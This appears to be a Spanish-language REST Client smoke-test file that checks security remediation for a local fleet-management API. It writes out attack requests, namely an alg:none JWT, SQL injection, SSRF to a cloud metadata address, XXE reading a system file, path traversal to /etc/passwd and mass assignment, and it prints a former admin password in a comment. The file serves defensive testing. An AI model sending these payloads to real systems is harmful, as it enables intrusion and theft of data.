### ──────────────────────────────────────────────────────────────────────────
### FleetSec App — Smoke tests (post-remediación Fases 1-2)
###
### Tras V-11, los endpoints protegidos requieren `Authorization: Bearer {{token}}`.
### Login primero (captura el token) y reusalo. Compatible con REST Client (VS Code).
### Estado: ✅ remediado (V-02, V-05, V-09, V-10, V-11) · 🔴 abierto → Fase 3 (V-01,V-03,V-04,V-06,V-07,V-08)
### ──────────────────────────────────────────────────────────────────────────

@host = http://localhost:8080

### Login (admin) — captura el token
# @name login
POST {{host}}/api/auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "{{$dotenv APP_ADMIN_PASSWORD}}"
}

### Token para reusar en los requests protegidos
@token = {{login.response.body.token}}

### ── V-11 ✅ · sin token → 401 (enforcement) ─────────────────────────────────
GET {{host}}/api/drivers/search?q=Ana

### ── V-11 ✅ · con token → 200 ───────────────────────────────────────────────
GET {{host}}/api/drivers/search?q=Ana
Authorization: Bearer {{token}}

### ── V-02 ✅ · token alg:none → 401 (jjwt lo rechaza) ────────────────────────
GET {{host}}/api/drivers/search?q=Ana
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9.

### ── V-05 ✅ · mass assignment: role/password NO asignables ──────────────────
### role queda DRIVER, phone sí cambia, password no aparece en la respuesta.
PATCH {{host}}/api/drivers/2
Authorization: Bearer {{token}}
Content-Type: application/json

{
  "phone": "+57 3000000000",
  "role": "ADMIN",
  "password": "x"
}

### ── V-09 ✅ · IDOR: (login como cgomez para probar 403 sobre otro id) ───────
### Con el token de admin devuelve 200; un driver pidiendo el id de otro → 403.
GET {{host}}/api/drivers/3/trips
Authorization: Bearer {{token}}

### ── V-10 ✅ · login con el password del entorno (rotado) → token ────────────
### (el password viejo `FleetS3c@dm1n-2026!` ahora da 401)
POST {{host}}/api/auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "{{$dotenv APP_ADMIN_PASSWORD}}"
}

### ── V-01 🔴 · SQL Injection (abierto → Fase 3) — ahora requiere token ───────
GET {{host}}/api/drivers/search?q=%27%20OR%20%271%27%3D%271
Authorization: Bearer {{token}}

### ── V-03 🔴 · SSRF (abierto → Fase 3) ───────────────────────────────────────
POST {{host}}/api/vehicles/1/webhook
Authorization: Bearer {{token}}
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/"
}

### ── V-04 🔴 · XXE (abierto → Fase 3) ────────────────────────────────────────
POST {{host}}/api/vehicles/import
Authorization: Bearer {{token}}
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fleet [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<fleet>&xxe;</fleet>

### ── V-06 🔴 · Path Traversal (abierto → Fase 3) ─────────────────────────────
GET {{host}}/api/reports/download?file=../../../../../../etc/passwd
Authorization: Bearer {{token}}

### ── V-07 🔴 · Missing Rate Limiting (abierto → Fase 3) ──────────────────────
POST {{host}}/api/auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "intento-fallido"
}

### ── V-08 🔴 · PII en logs (abierto → Fase 3) — evidencia en logs/ ───────────
GET {{host}}/api/drivers/search?q=Ana
Authorization: Bearer {{token}}
